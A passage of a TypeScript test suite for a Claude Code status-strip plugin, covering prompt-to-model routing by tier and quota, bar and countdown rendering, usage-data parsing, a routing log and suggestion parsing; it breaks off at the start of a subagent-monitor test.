/**
 * What has to keep working.
 *
 * The two things this mod gets wrong in ways nobody notices are routing a
 * planning job to a small model, and a strip that jitters or overflows. Both
 * are decided by pure functions, so both are tested here without a session.
 *
 * Run with: claude plugin test
 */

import { expect, test } from 'claude-code/testing';

import { classify, chooseModel, LONG_PROMPT, BRIEF_PROMPT } from '../hooks/hud-route.js';
import { MODELS, shortModel, resolveModel, NEWEST } from '../hooks/hud-models.js';
import { paceOf, paceText, paceMark, FAST_RATIO } from '../hooks/hud-pace.js';
import { record, logLines, tuneLines, signalsIn, snippet, commonWords, KEEP } from '../hooks/hud-log.js';
import { buildSuggestPrompt, parseSuggestions, WANTED, MAX_LENGTH } from '../hooks/hud-suggest.js';
import { readUsage, contextPercentOf, limitsOf, epochSecondsOf, asPercent, describeUsage, hasFableWindow } from '../hooks/hud-usage.js';
import { levelOf, resetFormFor, clockText, readingsFor, worstLevel, needsClock, leadNote,
    CALM, WATCH, URGENT, COUNTDOWN_WITHIN_MS } from '../hooks/hud-focus.js';
import { todosFrom, progressOf, countText, worthShowing, MIN_PLAN, applyTaskTool, todosFromTasks, planReport } from '../hooks/hud-progress.js';
import { planBar } from '../hooks/hud-format.js';
import { buildPanel, PANE_ID, DEFAULT_COLLAPSED } from '../hooks/hud-panel.js';
import { spawned, shortName, addTokens, tokensOf, merge, visible, prune, shares, comparable,
    elapsedText, tokenText, statusColor, LINGER_MS } from '../hooks/hud-agents.js';
import { assess, firstPath, previewFor, countLines, describe, warningFor } from '../hooks/hud-blast.js';
import { shouldCheck, buildHeadsPrompt, flatten, parseHeadsUp } from '../hooks/hud-heads.js';
import { barText, barPieces, fit, layout, buildGroups, percentText, modelText, resetText, shortKind, tone, width } from '../hooks/hud-format.js';

const OPTS = {
    fastModel: 'haiku',
    baseModel: 'sonnet',
    deepModel: 'opus',
    topModel: 'fable',
    routeToTop: true,
    spareAbove: 85,
    barCells: 10,
    ascii: false,
};

const ROOMY = { rateLimits: [{ kind: 'five_hour', percentUsed: 20, resetsAt: 0 }] };
const TIGHT = { rateLimits: [{ kind: 'five_hour', percentUsed: 91, resetsAt: 0 }] };

test('planning work reads as deep', async () => {
    expect(classify('plan out the migration for the sync layer')).toBe('deep');
    expect(classify('why does this deadlock on the second connection?')).toBe('deep');
    expect(classify('refactor the settings panel')).toBe('deep');
});

test('a typo fix reads as fast', async () => {
    expect(classify('fix the typo in the footer copy')).toBe('fast');
    expect(classify('rename this variable to sessionRowId')).toBe('fast');
});

test('anything else is everyday work, not the cheapest model', async () => {
    // The uncertain case must not fall to the small model: a real task sent
    // there wastes the whole turn, where the reverse wastes a few cents.
    expect(classify('add a column for the last sync time')).toBe('base');
    expect(classify('')).toBe('base');
});

test('a long prompt is deep however it is worded', async () => {
    const long = 'tidy up this file. '.repeat(Math.ceil(LONG_PROMPT / 19) + 1);
    expect(long.length >= LONG_PROMPT).toBe(true);
    expect(classify(long)).toBe('deep');
});

test('a planning prompt that also says rename is still deep', async () => {
    // Both patterns match, and the expensive signal is the reliable one.
    expect(classify('plan the rename of every customer field')).toBe('deep');
});

test('asking for the best model in words is enough on its own', async () => {
    // Second-guessing someone who wrote "use the best model" is not thrift.
    expect(classify('use the best model for this')).toBe('top');
    expect(classify('think really hard about this one')).toBe('top');
    expect(classify('use fable here')).toBe('top');
    expect(classify('no shortcuts on this')).toBe('top');
});

test('planning plus whole-system scope reaches the flagship', async () => {
    expect(classify('design the architecture for the entire system')).toBe('top');
    expect(classify('plan a rewrite of the whole codebase')).toBe('top');
    expect(classify('design the schema from scratch')).toBe('top');
});

test('planning plus real stakes reaches the flagship', async () => {
    expect(classify('plan the migration of the production database')).toBe('top');
    expect(classify('design a fix for the data loss in the sync layer')).toBe('top');
});

test('a long planning-shaped brief reaches the flagship', async () => {
    const brief = 'plan this out. ' + 'here is more context about the system. '.repeat(40);
    expect(brief.length >= BRIEF_PROMPT).toBe(true);
    expect(classify(brief)).toBe('top');
});

test('planning on its own is only deep, never the flagship', async () => {
    // Otherwise every design question would go to the most expensive model.
    expect(classify('plan out the migration for the sync layer')).toBe('deep');
    expect(classify('refactor the settings panel')).toBe('deep');
    expect(classify('why does this deadlock?')).toBe('deep');
});

test('scope or stakes without planning is not the flagship', async () => {
    expect(classify('run the tests for the entire project')).not.toBe('top');
    expect(classify('restart production')).not.toBe('top');
});

test('the flagship tier routes to the flagship when there is room', async () => {
    const picked = chooseModel('top', ROOMY, OPTS);
    expect(picked.model).toBe('fable');
    expect(picked.held).toBe(false);
});

test('a thin window steps the flagship down one rung, not to the cheap end', async () => {
    // Whole-system work is still whole-system work when quota is short.
    const picked = chooseModel('top', TIGHT, OPTS);
    expect(picked.model).toBe('opus');
    expect(picked.tier).toBe('deep');
    expect(picked.held).toBe(true);
});

test('turning route_to_top off makes the flagship tier behave as deep', async () => {
    const off = { ...OPTS, routeToTop: false };
    expect(chooseModel('top', ROOMY, off).model).toBe('opus');
    expect(chooseModel('top', TIGHT, off).model).toBe('sonnet');
});

test('an empty top_model also falls back to deep', async () => {
    expect(chooseModel('top', ROOMY, { ...OPTS, topModel: '' }).model).toBe('opus');
});

test('routing up is held back when the five-hour window is nearly gone', async () => {
    const tight = { rateLimits: [{ kind: 'five_hour', percentUsed: 91, resetsAt: 0 }] };
    const picked = chooseModel('deep', tight, OPTS);
    expect(picked.model).toBe('sonnet');
    expect(picked.held).toBe(true);
});

test('and is not held back when there is room', async () => {
    const roomy = { rateLimits: [{ kind: 'five_hour', percentUsed: 40, resetsAt: 0 }] };
    const picked = chooseModel('deep', roomy, OPTS);
    expect(picked.model).toBe('opus');
    expect(picked.held).toBe(false);
});

test('small work is never held back, since holding it saves nothing', async () => {
    const tight = { rateLimits: [{ kind: 'five_hour', percentUsed: 99, resetsAt: 0 }] };
    expect(chooseModel('fast', tight, OPTS).model).toBe('haiku');
});

test('a bar is always its stated width, brackets included', async () => {
    for (const pct of [0, 1, 37, 99, 100, -5, 140]) {
        for (const cells of [10, 8]) {
            expect(barText(pct, cells).length).toBe(cells);
        }
    }
});

test('a bar is bracketed, so its extent is visible even when nearly empty', async () => {
    // Without the frame you cannot see where a 4% bar ends, and the strip
    // reads as loose characters rather than as a gauge.
    for (const pct of [0, 4, 50, 100]) {
        const text = barText(pct, 10);
        expect(text.startsWith('[')).toBe(true);
        expect(text.endsWith(']')).toBe(true);
    }
});

test('a bar distinguishes empty, nearly empty, nearly full and full', async () => {
    // 4% drawing as empty would read as a window nobody has touched, and
    // 99% drawing as full would read as one already gone.
    expect(barText(0, 10)).toBe('[········]');
    expect(barText(100, 10)).toBe('[████████]');
    expect(barText(4, 10).indexOf('·') > 1).toBe(true);
    expect(barText(99, 10).indexOf('·')).toBe(-1);
    expect(barText(99, 10)).not.toBe(barText(100, 10));
});

test('the leading edge is what makes ten columns say more than eleven things', async () => {
    // Whole cells give 11 distinct bars across the range. Eighths give 81,
    // which is the difference between seeing 77% move to 81% and not.
    const seen = new Set();
    for (let p = 0; p <= 100; p += 1) seen.add(barText(p, 10));
    expect(seen.size > 60).toBe(true);
    expect(barText(40, 10)).not.toBe(barText(43, 10));
    expect(barText(77, 10)).not.toBe(barText(79, 10));
});

test('the fill is coloured by zone, so a full window shows how it got there', async () => {
    // At 91% the bar runs green, then amber, then red along its length.
    const colours = barPieces(91, 10).filter((p) => p.color).map((p) => p.color);
    expect(colours.includes('green')).toBe(true);
    expect(colours.includes('yellow')).toBe(true);
    expect(colours.includes('red')).toBe(true);

    // At 31% there is nothing but green in it.
    const calm = barPieces(31, 10).filter((p) => p.color).map((p) => p.color);
    expect(calm.every((c) => c === 'green')).toBe(true);
});

test('same-coloured cells are merged, so a bar is a few elements not ten', async () => {
    expect(barPieces(100, 10).length <= 6).toBe(true);
});

test('the bar uses no ambiguous-width character, which would break alignment', async () => {
    // Filled and hollow squares or circles would read better, and are East
    // Asian Ambiguous width: some terminals draw them double-width and the
    // whole strip loses its columns.
    const AMBIGUOUS = /[■□▪▫●○◼◻⬛⬜]/;
    for (const ascii of [false, true]) {
        for (const pct of [0, 33, 66, 100]) {
            expect(AMBIGUOUS.test(barText(pct, 10, ascii))).toBe(false);
        }
    }
});

test('the ascii bar is for a terminal that is not in UTF-8', async () => {
    expect(barText(50, 10, true)).toBe('[####....]');
    expect(/[^\x20-\x7e]/.test(barText(50, 10, true))).toBe(false);
});

test('percentages and model names keep a fixed width, so nothing jitters', async () => {
    expect(percentText(7).length).toBe(4);
    expect(percentText(100).length).toBe(4);
    expect(modelText('haiku').length).toBe(10);
    expect(modelText('sonnet 5.5').length).toBe(10);
    expect(modelText('a-very-long-model-name').length).toBe(10);
});

test('a reset is a countdown, shaped by how far away it is', async () => {
    // "1h41m" answers the question the percentage raises; "14:20" makes
    // you do the subtraction.
    const NOW = Date.UTC(2026, 9, 19, 12, 0, 0);
    const at = (m: number) => resetText(Math.floor((NOW + m * 60000) / 1000), NOW);
    expect(at(41)).toBe('41m');
    expect(at(101)).toBe('1h41m');
    expect(at(299)).toBe('4h59m');
    expect(at(300)).toBe('5h');
    expect(at(420)).toBe('7h');
    expect(at(3 * 1440 + 11 * 60)).toBe('3d,11h');
});

test('a day or more never carries minutes, and nothing counts backwards', async () => {
    const NOW = Date.UTC(2026, 9, 19, 12, 0, 0);
    const at = (m: number) => resetText(Math.floor((NOW + m * 60000) / 1000), NOW);
    for (const m of [1440, 2000, 4980, 10080]) {
        expect(/m$/.test(at(m))).toBe(false);
    }
    expect(at(0)).toBe('now');
    expect(at(-5)).toBe('now');
    expect(resetText(0, NOW)).toBe('');
    expect(resetText(null as unknown as number, NOW)).toBe('');
});

test('the colour changes at the thresholds and nowhere else', async () => {
    // Green to 55, amber 56 to 85, red 86 and up.
    expect(tone(0)).toBe('green');
    expect(tone(55)).toBe('green');
    expect(tone(56)).toBe('yellow');
    expect(tone(85)).toBe('yellow');
    expect(tone(86)).toBe('red');
    expect(tone(100)).toBe('red');
});

test('a fractional reading takes the colour of the number that is printed', async () => {
    // 85.6 prints as 86%, so it has to be red. Comparing before rounding
    // would put a red number beside an amber bar.
    expect(tone(55.4)).toBe('green');
    expect(tone(55.6)).toBe('yellow');
    expect(tone(85.4)).toBe('yellow');
    expect(tone(85.6)).toBe('red');
    expect(percentText(85.6).trim()).toBe('86%');
});

const FULL = {
    model: 'haiku',
    pinned: false,
    routing: true,
    contextPercent: 31,
    rateLimits: [
        { kind: 'five_hour', percentUsed: 18, resetsAt: Math.floor(Date.now() / 1000) + 3600 },
        { kind: 'seven_day', percentUsed: 42, resetsAt: Math.floor(Date.now() / 1000) + 200000 },
    ],
};

test('the whole strip fits a wide window', async () => {
    const pieces = fit(buildGroups(FULL, OPTS), 200);
    expect(width(pieces) <= 200).toBe(true);
    expect(pieces.some((p) => p.text.indexOf('Session') === 0)).toBe(true);
});

test('a narrow window sheds the reset times before a whole reading', async () => {
    const groups = buildGroups(FULL, OPTS);
    const full = width(fit(groups, 200));
    const pieces = fit(groups, full - 4);
    expect(pieces.some((p) => p.text.indexOf('\u21bb') >= 0)).toBe(false);
    expect(pieces.some((p) => p.text.indexOf('Week') === 0)).toBe(true);
});

test('a very narrow window keeps the model and drops the rest', async () => {
    const pieces = fit(buildGroups(FULL, OPTS), 16);
    expect(pieces.length > 0).toBe(true);
    expect(pieces[0].text.indexOf('haiku')).toBe(0);
    expect(pieces.some((p) => p.text.indexOf('Week') === 0)).toBe(false);
});

test('a window with no readings at all still names the model', async () => {
    const bare = { model: 'sonnet', pinned: true, routing: false, contextPercent: null, rateLimits: [] };
    const pieces = fit(buildGroups(bare, OPTS), 80);
    expect(pieces[0].text.indexOf('sonnet')).toBe(0);
    expect(pieces.some((p) => p.text.trim() === 'pin')).toBe(true);
});

test('a spend limit is left out, since a dollar cap is not a quota', async () => {
    const odd = { ...FULL, rateLimits: [{ kind: 'spend_limit', percentUsed: 10, resetsAt: 0 }] };
    const pieces = fit(buildGroups(odd, OPTS), 200);
    expect(pieces.some((p) => p.text.indexOf('spend') >= 0)).toBe(false);
});

test('a window this list has never seen is shown, not hidden', async () => {
    // Fable bills against its own weekly allowance. Dropping a limit for
    // being unrecognised is how you run out of something nobody showed you.
    const fable = { ...FULL, rateLimits: [{ kind: 'seven_day_fable', percentUsed: 40, resetsAt: 0 }] };
    const pieces = fit(buildGroups(fable, OPTS), 200);
    expect(pieces.some((p) => p.text.indexOf('Fable') === 0)).toBe(true);
});

test('the window names match what the usage panel calls them', async () => {
    // "7d" beside a reset time reads as seven days to reset. It is the
    // name of the window, and the name is what was wrong.
    expect(shortKind('five_hour')).toBe('Session');
    expect(shortKind('seven_day')).toBe('Week');
    expect(shortKind('seven_day_fable')).toBe('Fable');
    expect(shortKind('spend_limit')).toBe('');
    expect(shortKind('')).toBe('');
});

test('a roomy window gets the full bar width', async () => {
    // The bar is several pieces now, so measure from bracket to bracket.
    const pieces = layout(FULL, 120, OPTS);
    const open = pieces.findIndex((p) => p.text === '[');
    expect(open >= 0).toBe(true);
    let w = 0;
    let k = open;
    while (k < pieces.length) { w += pieces[k].text.length; if (pieces[k].text === ']') break; k += 1; }
    expect(w).toBe(OPTS.barCells);
});

test('a narrow window narrows the bars rather than losing a reading', async () => {
    // The seven-day window used to be dropped to save nine characters that
    // were sitting in the bars.
    const pieces = layout(FULL, 70, OPTS);
    expect(width(pieces) <= 70).toBe(true);
    expect(pieces.some((p) => p.text.indexOf('Session') === 0)).toBe(true);
    expect(pieces.some((p) => p.text.indexOf('Week') === 0)).toBe(true);
});

test('the strip never overflows, at any width', async () => {
    for (let cols = 12; cols <= 200; cols += 1) {
        const pieces = layout(FULL, cols, OPTS);
        expect(width(pieces) <= cols || pieces.length <= 3).toBe(true);
    }
});

test('an unmeasured window draws at full width rather than collapsing', async () => {
    for (const columns of [undefined, 0, null]) {
        const pieces = layout(FULL, columns as number, OPTS);
        expect(pieces.some((p) => p.text.indexOf('Week') === 0)).toBe(true);
    }
});

test('/hud says whether it is routing, and stops when told to', async ($) => {
    const status = await $.command.run({ command: 'hud', args: '' });
    expect(status.text.indexOf('routing: on') >= 0).toBe(true);

    const off = await $.command.run({ command: 'hud', args: 'off' });
    expect(off.text.indexOf('Routing off') >= 0).toBe(true);

    const back = await $.command.run({ command: 'hud', args: 'auto' });
    expect(back.text.indexOf('Routing on') >= 0).toBe(true);
});

test('every model in the catalogue is a full id, never an alias', async () => {
    // An alias on the request is the bug this file exists to prevent: the
    // engine answers "the selected model (sonnet) may not exist".
    for (const m of MODELS) {
        expect(/^claude-[a-z]+-\d+(-\d+)?$/.test(m.id)).toBe(true);
        expect(['haiku', 'sonnet', 'opus', 'fable', 'best'].includes(m.id)).toBe(false);
    }
});

test('a family name resolves to that family newest', async () => {
    expect(resolveModel('sonnet')).toBe('claude-sonnet-5-5');
    expect(resolveModel('opus')).toBe('claude-opus-5-5');
    expect(resolveModel('haiku')).toBe('claude-haiku-5-5');
    expect(resolveModel('fable')).toBe('claude-fable-5-1');
    expect(resolveModel('best')).toBe(NEWEST.fable);
});

test('an older model can be picked by name', async () => {
    expect(resolveModel('opus 4.8')).toBe('claude-opus-4-8');
    expect(resolveModel('opus-4-8')).toBe('claude-opus-4-8');
    expect(resolveModel('sonnet 5')).toBe('claude-sonnet-5');
    expect(resolveModel('haiku 4.5')).toBe('claude-haiku-4-5');
});

test('a full id passes through, in any case', async () => {
    expect(resolveModel('claude-opus-5-5')).toBe('claude-opus-5-5');
    expect(resolveModel('Claude-Fable-5-1')).toBe('claude-fable-5-1');
});

test('nonsense resolves to null rather than to a guess', async () => {
    // Guessing would set a tier to a model that fails on the next request,
    // far from where the mistake was made.
    for (const bad of ['', '   ', 'sonnet5', 'gpt-4', 'nonsense', 'claude-nope-9-9']) {
        expect(resolveModel(bad)).toBe(null, JSON.stringify(bad));
    }
});

test('every short name fits the ten-column model field', async () => {
    for (const m of MODELS) expect(m.short.length <= 10, m.short).toBe(true);
});

test('an id the catalogue has never heard of still prints sensibly', async () => {
    expect(shortModel('claude-newthing-6-2')).toBe('newthing 6.2');
    expect(shortModel('something-else')).toBe('something-else');
    expect(shortModel('')).toBe('');
});

const NOW = Date.UTC(2026, 9, 19, 12, 0, 0);
const resetIn = (m: number) => Math.floor((NOW + m * 60000) / 1000);

test('on pace says nothing', async () => {
    // Half the window used at half past is exactly on pace.
    const p = paceOf('Session', 50, resetIn(150), NOW);
    expect(p !== null).toBe(true);
    expect(Math.abs(p.ratio - 1) < 0.01).toBe(true);
    expect(paceText(p)).toBe('');
});

test('burning fast says how fast, and when it runs out', async () => {
    const p = paceOf('Session', 91, resetIn(221), NOW);
    expect(p.ratio > 3).toBe(true);
    expect(/pace/.test(paceText(p))).toBe(true);
    expect(/dry in/.test(paceText(p))).toBe(true);
});

test('a window nearly over is not a warning just because it is nearly full', async () => {
    // 91% used with 20 minutes left is what a spent window looks like.
    // Warning there would make the warning meaningless.
    const p = paceOf('Session', 91, resetIn(20), NOW);
    expect(p.ratio < FAST_RATIO).toBe(true);
    expect(paceText(p)).toBe('');
});

test('a mild overspend stays quiet, so the warning keeps its meaning', async () => {
    for (const [pct, left] of [[31, 228], [45, 210], [60, 165]]) {
        const p = paceOf('Session', pct, resetIn(left), NOW);
        if (p.ratio < FAST_RATIO) expect(paceText(p)).toBe('');
    }
});

test('pacing refuses to guess when it cannot know', async () => {
    expect(paceOf('Nope', 50, resetIn(60), NOW)).toBe(null);
    expect(paceOf('Session', 50, 0, NOW)).toBe(null);
    expect(paceOf('Session', 50, 'x' as unknown as number, NOW)).toBe(null);
    expect(paceOf('Session', 50, resetIn(-10), NOW)).toBe(null);
    expect(paceText(null)).toBe('');
    expect(paceMark(null)).toBe(null);
});

test('an untouched window is never a warning', async () => {
    const p = paceOf('Week', 0, resetIn(3 * 1440), NOW);
    expect(p.ratio).toBe(0);
    expect(paceText(p)).toBe('');
});

test('the pace mark sits in the track without changing the bar width', async () => {
    for (const mark of [0, 0.25, 0.5, 0.9, 1]) {
        expect(barText(30, 10, false, mark).length).toBe(10);
    }
    expect(barText(30, 10, false, 0.75).indexOf('╎') >= 0).toBe(true);
    expect(barText(30, 10, false, null).indexOf('╎') >= 0).toBe(false);
});

test('a mark under the fill is hidden, which is the point', async () => {
    // Fill past the mark means ahead of the clock; the mark only shows
    // while there is still track to its right.
    expect(barText(95, 10, false, 0.1).indexOf('╎') >= 0).toBe(false);
});

test('the ascii bar carries no mark, since it has no character for one', async () => {
    expect(barText(30, 10, true, 0.5).indexOf('╎') >= 0).toBe(false);
    expect(barText(30, 10, true, 0.5).length).toBe(10);
});

test('the log keeps the newest and drops the oldest', async () => {
    let log = record([], { tier: 'base', text: 'p0', signals: [] });
    for (let i = 1; i < KEEP + 5; i += 1) {
        log = record(log, { tier: 'base', text: 'p' + i, signals: [] });
    }
    expect(log.length).toBe(KEEP);
    expect(log[log.length - 1].text).toBe('p' + (KEEP + 4));
    expect(log[0].text).toBe('p5');
});

test('a decision records which words fired, not just the tier', async () => {
    const found = signalsIn('plan the entire migration, no shortcuts');
    expect(found.indexOf('plan') >= 0).toBe(true);
    expect(found.indexOf('entire') >= 0).toBe(true);
    expect(found.indexOf('no shortcuts') >= 0).toBe(true);
});

test('signals match whole words, so planet is not plan', async () => {
    expect(signalsIn('render the planet mesh').indexOf('plan') >= 0).toBe(false);
    expect(signalsIn('formatting').indexOf('formatting') >= 0).toBe(true);
    expect(signalsIn('formatting').indexOf('format') >= 0).toBe(false);
});

test('a prompt is kept as a snippet, never in full', async () => {
    expect(snippet('x'.repeat(400)).length < 60).toBe(true);
    expect(snippet('   fix   the  typo  ')).toBe('fix the typo');
});

test('an empty log says so rather than printing nothing', async () => {
    expect(logLines([]).length).toBe(1);
    expect(/Nothing routed/.test(logLines([])[0])).toBe(true);
});

test('tuning says nothing until there is something to say', async () => {
    expect(/Not enough/.test(tuneLines([])[0])).toBe(true);
    expect(/Not enough/.test(tuneLines([{ tier: 'base', text: 'a' }])[0])).toBe(true);
});

test('tuning notices a tier that never fires', async () => {
    const log = [...Array(8)].map((unused, i) => ({ tier: 'base', text: 'update the readme ' + i }));
    const text = tuneLines(log).join('\n');
    expect(/cheap tier/.test(text)).toBe(true);
    expect(/middle tier/.test(text)).toBe(true);
});

test('tuning suggests only words it saw more than once', async () => {
    const log = [
        { tier: 'base', text: 'update the docs' },
        { tier: 'base', text: 'update the docs again' },
        { tier: 'base', text: 'kubernetes autoscaler thing' },
        { tier: 'base', text: 'another docs change' },
        { tier: 'base', text: 'more docs work' },
    ];
    const words = commonWords(log).map((pair) => pair[0]);
    expect(words.indexOf('docs') >= 0).toBe(true);
    // A word seen once must not become a rule.
    expect(words.indexOf('kubernetes') >= 0).toBe(false);
});

test('tuning ignores filler words', async () => {
    const log = [...Array(6)].map(() => ({ tier: 'base', text: 'please can you just make the thing' }));
    const words = commonWords(log).map((pair) => pair[0]);
    for (const filler of ['please', 'can', 'you', 'just', 'the']) {
        expect(words.indexOf(filler) >= 0).toBe(false);
    }
});

test('the suggestion request carries the work and asks for bare lines', async () => {
    const ask = buildSuggestPrompt('fix the parser', 'I changed parser.js and added a test.');
    expect(/fix the parser/.test(ask)).toBe(true);
    expect(/parser\.js/.test(ask)).toBe(true);
    expect(/No numbering/.test(ask)).toBe(true);
    expect(buildSuggestPrompt('', '')).toBe(null);
});

test('the request is capped, so a long turn cannot become a long bill', async () => {
    const huge = 'word '.repeat(5000);
    const ask = buildSuggestPrompt(huge, huge);
    expect(ask.length < 1800).toBe(true);
    expect(ask.length < huge.length / 10).toBe(true);
});

test('a tidy answer parses to exactly the suggestions', async () => {
    const reply = ['Run the parser tests', 'Add a case for empty input', 'Update the README'].join('\n');
    expect(parseSuggestions(reply)).toEqual(['Run the parser tests', 'Add a case for empty input', 'Update the README']);
});

test('a messy answer is cleaned rather than shown raw', async () => {
    const messy = [
        'Sure! Here are three ideas:',
        '1. Run the parser tests',
        '- "Add a case for empty input"',
        '* Update the README for the new flag',
        'This one is far too long to be a button and ought to be dropped by the parser entirely',
        'Run the parser tests',
    ].join('\n');
    const out = parseSuggestions(messy);
    expect(out.length).toBe(3);
    expect(out.some((x) => /^(sure|here)/i.test(x))).toBe(false);
    expect(out.some((x) => /^[-*\d]/.test(x))).toBe(false);
    expect(out.some((x) => x.indexOf('"') >= 0)).toBe(false);
    expect(out.some((x) => x.length > MAX_LENGTH)).toBe(false);
    expect(new Set(out).size).toBe(out.length);
});

test('nothing usable produces nothing, rather than junk', async () => {
    for (const bad of ['', null, undefined, 'Okay', 'Here you go:', 'word', '   ']) {
        expect(parseSuggestions(bad as string)).toEqual([]);
    }
});

test('it never offers more than it has room for', async () => {
    const many = [...Array(20)].map((unused, i) => 'Do the thing number ' + i).join('\n');
    expect(parseSuggestions(many).length).toBe(WANTED);
});

test('an object reply is read as well as a string', async () => {
    const reply = { text: ['Run the tests now', 'Check the log file'].join('\n') };
    expect(parseSuggestions(reply)).toEqual(['Run the tests now', 'Check the log file']);
});

test('one word may sit between the size and the thing', async () => {
    // "the entire billing schema" is the same claim as "the entire
    // schema", and the stricter pattern only saw the second.
    expect(classify('plan the migration of the entire billing schema')).toBe('top');
    expect(classify('plan the entire payment pipeline')).toBe('top');
    expect(classify('design the whole billing service')).toBe('top');
});

test('but only one, or any big-sounding phrase would qualify', async () => {
    // "the entire point of this small fix" is not a whole-system brief.
    expect(classify('that is the entire point of this small fix')).not.toBe('top');
    expect(classify('plan the entire point of the small schema change')).not.toBe('top');
});

test('the log lines up in columns', async () => {
    // The padding used to be applied to the closing quote rather than to
    // the text, so nothing lined up and the reasons wandered.
    const entries = [
        { tier: 'fast', short: 'haiku 5.5', text: 'short one', signals: ['typo'] },
        { tier: 'deep', short: 'opus 5.5', text: 'a considerably longer prompt than that one', signals: ['plan'] },
    ];
    const lines = logLines(entries);
    const at = lines.map((l) => l.indexOf('['));
    expect(at[0]).toBe(at[1]);
});

test('a percentage is read whatever it is called', async () => {
    // The live failure this exists to stop: insisting on one spelling made
    // the context reading vanish from a strip whose other numbers were fine.
    for (const key of ['percent', 'percentUsed', 'percent_used', 'usedPercentage', 'used_percentage']) {
        expect(Math.round(contextPercentOf({ context: { [key]: 31 } }))).toBe(31);
    }
});

test('a fraction is scaled, because 0.31 and 31 are the same reading', async () => {
    expect(Math.round(contextPercentOf({ context: { percent: 0.31 } }))).toBe(31);
    expect(Math.round(contextPercentOf({ context: { percent: 31 } }))).toBe(31);
});

test('exactly 1 is read as one percent, the safer of the two mistakes', async () => {
    // Reading it as 100% would paint the bar red and claim you were out.
    expect(asPercent(1)).toBe(1);
});

test('a missing percentage is rebuilt from tokens and window', async () => {
    expect(Math.round(contextPercentOf({ context: { tokens: 50000, window: 200000 } }))).toBe(25);
});

test('and from the remaining percentage when that is all there is', async () => {
    expect(Math.round(contextPercentOf({ context: { remainingPercentage: 70 } }))).toBe(30);
});

test('no context at all is null, not zero', async () => {
    // Zero would draw an empty bar and claim the context was untouched.
    expect(contextPercentOf({})).toBe(null);
    expect(contextPercentOf({ context: null })).toBe(null);
    expect(contextPercentOf({ context: {} })).toBe(null);
    expect(contextPercentOf(null)).toBe(null);
});

test('limits are read under any of their names', async () => {
    for (const key of ['rateLimits', 'rate_limits', 'limits']) {
        const out = limitsOf({ [key]: [{ kind: 'five_hour', percentUsed: 18, resetsAt: 1792400000 }] });
        expect(out.length).toBe(1);
        expect(out[0].percentUsed).toBe(18);
    }
});

test('a reset time is read as seconds, from seconds, milliseconds or a date', async () => {
    const seconds = 1792400000;
    expect(epochSecondsOf({ resetsAt: seconds })).toBe(seconds);
    expect(epochSecondsOf({ resetsAt: seconds * 1000 })).toBe(seconds);
    expect(epochSecondsOf({ reset_at: seconds })).toBe(seconds);
    expect(epochSecondsOf({ resetAt: seconds })).toBe(seconds);
    expect(epochSecondsOf({ resetsAt: new Date(seconds * 1000).toISOString() })).toBe(seconds);
});

test('a window with no reset time still shows its percentage', async () => {
    // Losing a whole reading because one field is missing is the bug.
    const out = limitsOf({ rateLimits: [{ kind: 'seven_day', percentUsed: 56 }] });
    expect(out.length).toBe(1);
    expect(out[0].percentUsed).toBe(56);
    expect(out[0].resetsAt).toBe(null);
});

test('a window with no percentage is dropped, since it has nothing to say', async () => {
    expect(limitsOf({ rateLimits: [{ kind: 'five_hour' }] }).length).toBe(0);
});

test('junk never throws on a welcome screen', async () => {
    const junk = [null, undefined, 42, 'nope', {}, { rateLimits: 'nope' }, { rateLimits: [null, 7] }];
    for (const bad of junk) {
        const out = readUsage(bad);
        expect(out.contextPercent).toBe(null);
        expect(Array.isArray(out.rateLimits)).toBe(true);
    }
});

test('the documented shape reads correctly end to end', async () => {
    const usage = {
        startedAt: 1792300000,
        context: { tokens: 62000, window: 200000, percent: 31 },
        rateLimits: [
            { kind: 'five_hour', percentUsed: 4, resetsAt: 1792400000 },
            { kind: 'seven_day', percentUsed: 56, resetsAt: 1792700000 },
        ],
        cost: { total_cost_usd: 0.42 },
    };
    const out = readUsage(usage);
    expect(Math.round(out.contextPercent)).toBe(31);
    expect(out.rateLimits.length).toBe(2);
    expect(out.rateLimits[1].kind).toBe('seven_day');
    expect(out.rateLimits[1].resetsAt).toBe(1792700000);
});

test('the same reading under every other spelling gives the same answer', async () => {
    const usage = {
        context: { used_tokens: 62000, context_window_size: 200000 },
        rate_limits: [{ type: 'five_hour', used_percentage: 4, reset_at: 1792400000 }],
    };
    const out = readUsage(usage);
    expect(Math.round(out.contextPercent)).toBe(31);
    expect(out.rateLimits[0].kind).toBe('five_hour');
    expect(out.rateLimits[0].resetsAt).toBe(1792400000);
});

test('/hud raw says what it found, and what it made of it', async () => {
    const lines = describeUsage({ context: { percent: 31 }, rateLimits: [{ kind: 'five_hour', percentUsed: 4 }] });
    const text = lines.join('\n');
    expect(/context: percent/.test(text)).toBe(true);
    expect(/read as: context 31%/.test(text)).toBe(true);
    expect(/no reset time/.test(text)).toBe(true);
    expect(/nothing usable/.test(describeUsage(null).join('\n'))).toBe(true);
});

// ============================================================ subagent monitor

test('an agent is recorded once, however many times it is announced', async () => {
    let agents = spawned([], { agentId: 'a1', subagent_type: 'general-purpose' });
    agents = spawned(agents, { agentId: 'a1', subagent_type: 'general-purpose' });
    expect(agents.length).toBe(1);
    expect(agents[0].name).toBe('general');
});

test('an announcement with no id is ignored rather than stored as undefined', async () => {
    expect(spawned([], {}).length).toBe(0);
    expect(spawned([], null).length).toBe(0);
});

test('an agent name is shortened to fit a row', async () => {
    expect(shortName({ subagent_type: 'code-reviewer' })).toBe('code');
    expect(shortName({ type: 'Explore' })).toBe('explore');
    expect(shortName({})).toBe('agent');
    expect(shortName({ name: 'averyverylongagentname' }).length <= 9).toBe(true);
});

test('tokens land on the agent that spent them, and nowhere else', async () => {
    let agents = spawned(spawned([], { agentId: 'a1' }), { agentId: 'a2' });
    agents = addTokens(agents, 'a1', 500);
    agents = addTokens(agents, 'a1', 250);
    agents = addTokens(agents, 'a2', 100);
    expect(agents.find((a) => a.id === 'a1').tokens).toBe(750);
    expect(agents.find((a) => a.id === 'a2').tokens).toBe(100);
});

test('tokens for an agent nobody knows about change nothing', async () => {
    const agents = spawned([], { agentId: 'a1' });
    expect(addTokens(agents, 'ghost', 900)).toEqual(agents);
    expect(addTokens(agents, '', 900)).toEqual(agents);
    expect(addTokens(agents, 'a1', 0)).toEqual(agents);
});

test('a usage report is totalled however its fields are named', async () => {
    expect(tokensOf({ input_tokens: 100, output_tokens: 50 })).toBe(150);
    expect(tokensOf({ inputTokens: 100, cacheReadInputTokens: 20 })).toBe(120);
    expect(tokensOf({})).toBe(0);
    expect(tokensOf(null)).toBe(0);
    expect(tokensOf({ input_tokens: 'lots' })).toBe(0);
});

test('the agent list is the authority on status', async () => {
